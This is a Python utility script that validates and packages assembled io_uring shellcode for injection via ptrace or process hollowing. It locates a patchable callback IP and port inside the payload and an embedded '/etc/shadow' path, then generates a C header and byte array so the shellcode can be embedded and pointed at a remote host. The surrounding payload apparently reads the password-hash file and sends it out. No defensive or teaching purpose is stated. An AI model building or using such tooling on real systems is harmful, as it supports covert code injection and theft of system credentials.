#!/usr/bin/env python3
"""
extract.py — validate and inspect assembled io_uring shellcode

Usage:
    python3 extract.py shellcode.bin [--header shellcode.h]

Output:
    - Size in bytes
    - Null byte count and offsets (warn, not fail — ptrace injection is OK)
    - Locate _config_ip and _config_port by marker patterns
    - Generate C header with #define offsets
    - Print C array for embedding

Null bytes matter only for null-terminated injection (strcpy-style vulns).
For ptrace / process hollowing: null bytes are irrelevant.
"""

import sys
import argparse
import struct
from pathlib import Path


def find_pattern(data: bytes, pattern: bytes) -> list[int]:
    """Return all offsets where pattern occurs in data."""
    offsets = []
    start = 0
    while True:
        idx = data.find(pattern, start)
        if idx == -1:
            break
        offsets.append(idx)
        start = idx + 1
    return offsets


def locate_config(data: bytes) -> dict:
    """
    Locate _config_sa — the 16-byte struct sockaddr_in at the data tail —
    by searching for the default sentinel byte run near the end of the
    binary: family (0x02,0x00) + default port (0x11,0x5c BE) + default IP
    ([127,0,0,1] network byte order). sin_port = sa+2, sin_addr = sa+4
    (sqpoll_min.asm data-tail contract).
    """
    offsets = {}
    search_from = len(data) * 3 // 4  # search in last 25% of binary

    sa_pattern = bytes([0x02, 0x00, 0x11, 0x5C, 127, 0, 0, 1])
    for off in find_pattern(data[search_from:], sa_pattern):
        base = search_from + off
        offsets['CONFIG_PORT_OFFSET'] = base + 2
        offsets['CONFIG_IP_OFFSET'] = base + 4
        break  # take first occurrence

    # Path sentinel: /etc/shadow (read-only, not patchable, just informational)
    path_pattern = b'/etc/shadow\x00'
    for off in find_pattern(data, path_pattern):
        offsets['PATH_SHADOW_OFFSET'] = off
        break

    return offsets


def emit_header(data: bytes, offsets: dict, outfile: Path) -> None:
    lines = [
        "/* shellcode.h — generated by extract.py */",
        "/* Patch CONFIG_IP_OFFSET and CONFIG_PORT_OFFSET before injection */",
        "",
        f"#define SHELLCODE_SIZE        {len(data)}",
        "",
    ]
    for name, off in sorted(offsets.items()):
        lines.append(f"#define {name:<28} {off}")

    lines += [
        "",
        "/* Patch helper (overwrites config bytes at runtime): */",
        "/* patch_ip(sc, ip_bytes)   — write 4 bytes at CONFIG_IP_OFFSET   */",
        "/* patch_port(sc, port_be)  — write 2 bytes at CONFIG_PORT_OFFSET */",
        "",
        f"extern unsigned char shellcode[{len(data)}];",
    ]
    outfile.write_text('\n'.join(lines) + '\n')
    print(f"[*] Header written: {outfile}")


def emit_c_array(data: bytes) -> None:
    print(f"\nunsigned char shellcode[{len(data)}] = {{")
    for i in range(0, len(data), 12):
        chunk = data[i:i+12]
        row = ', '.join(f'0x{b:02x}' for b in chunk)
        print(f"    {row},")
    print("};")


def main():
    parser = argparse.ArgumentParser(description='Validate io_uring shellcode binary')
    parser.add_argument('binary', help='Assembled shellcode binary')
    parser.add_argument('--header', default='shellcode.h',
                        help='Output C header file (default: shellcode.h)')
    parser.add_argument('--no-array', action='store_true',
                        help='Skip printing C array')
    args = parser.parse_args()

    data = Path(args.binary).read_bytes()

    print(f"[*] Binary:     {args.binary}")
    print(f"[*] Size:       {len(data)} bytes")

    nulls = [i for i, b in enumerate(data) if b == 0]
    if nulls:
        print(f"[!] Null bytes: {len(nulls)} (offsets: {nulls[:10]}{'...' if len(nulls) > 10 else ''})")
        print(f"[!] Note: null bytes only matter for null-terminated injection contexts.")
        print(f"[!]       For ptrace / process hollowing: irrelevant.")
    else:
        print(f"[*] Null bytes: 0 — PASS")

    offsets = locate_config(data)
    if offsets:
        print(f"\n[*] Patchable config offsets:")
        for name, off in sorted(offsets.items()):
            val_hex = data[off:off+4].hex()
            print(f"    {name:<28} = {off}  (current bytes: {val_hex[:8]})")
    else:
        print(f"[!] Could not locate config sentinels — check default IP/port values")

    emit_header(data, {k: v for k, v in offsets.items()
                        if 'CONFIG' in k}, Path(args.header))

    if not args.no_array:
        emit_c_array(data)


if __name__ == '__main__':
    main()
